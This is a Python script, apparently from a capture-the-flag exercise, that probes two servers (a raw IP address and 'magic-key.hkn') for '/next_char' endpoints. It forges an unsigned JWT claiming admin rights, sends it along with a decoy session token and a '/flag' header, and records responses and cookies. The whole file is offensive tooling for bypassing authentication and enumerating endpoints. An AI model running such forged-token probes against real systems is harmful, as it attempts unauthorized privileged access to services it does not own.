#!/usr/bin/env python3
import base64, json, time, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header_b64 = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload_b64 = b64url(json.dumps({"admin": True, "timestamp": int(time.time())}, separators=(",", ":")).encode())
forged_jwt = f"{header_b64}.{payload_b64}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"

SECRET = "77.204.214.64"
MAGIC = "magic-key.hkn"

print("### Does /next_char (singular) exist at all, on either server? ###")
for host in (SECRET, MAGIC):
    for path in ("/next_char", "/next_char/", "/nextchar", "/next-char"):
        r = requests.get(f"http://{host}{path}", headers={"JWT": forged_jwt}, timeout=4)
        print(f"  {host}{path} -> {r.status_code}: {r.text.strip()[:150]}")
        # also check for Set-Cookie
        if "Set-Cookie" in r.headers:
            print(f"    Set-Cookie: {r.headers['Set-Cookie']}")

print("\n### Using a requests.Session() to persist cookies, call /next_char (singular) repeatedly, no char param, on secret-server ###")
s = requests.Session()
for i in range(10):
    r = s.get(f"http://{SECRET}/next_char", headers={"JWT": forged_jwt}, timeout=4)
    cookies = s.cookies.get_dict()
    print(f"  call {i}: -> {r.status_code}: {r.text.strip()[:150]}  cookies={cookies}")

print("\n### Same but on magic-key.hkn, with Session-Token decoy + URL-Maybe, using a session (cookies) ###")
s2 = requests.Session()
for i in range(10):
    r = s2.get(f"http://{MAGIC}/next_char", headers={
        "Session-Token": "dGhpcyB0b2tlbiBpcyBub3QgZ29vZA",
        "URL-Maybe": "/flag"
    }, timeout=4)
    cookies = s2.cookies.get_dict()
    print(f"  call {i}: -> {r.status_code}: {r.text.strip()[:150]}  cookies={cookies}")

print("\n### Check for Set-Cookie on the ORIGINAL /next_chars (plural) endpoint too, on both servers ###")
for host, hdrs in [(SECRET, {"JWT": forged_jwt}), (MAGIC, {"Session-Token": "dGhpcyB0b2tlbiBpcyBub3QgZ29vZA", "URL-Maybe": "/flag"})]:
    r = requests.get(f"http://{host}/next_chars", params={"char": "s"}, headers=hdrs, timeout=4)
    print(f"  {host}/next_chars -> {r.status_code}, Set-Cookie: {r.headers.get('Set-Cookie')}")
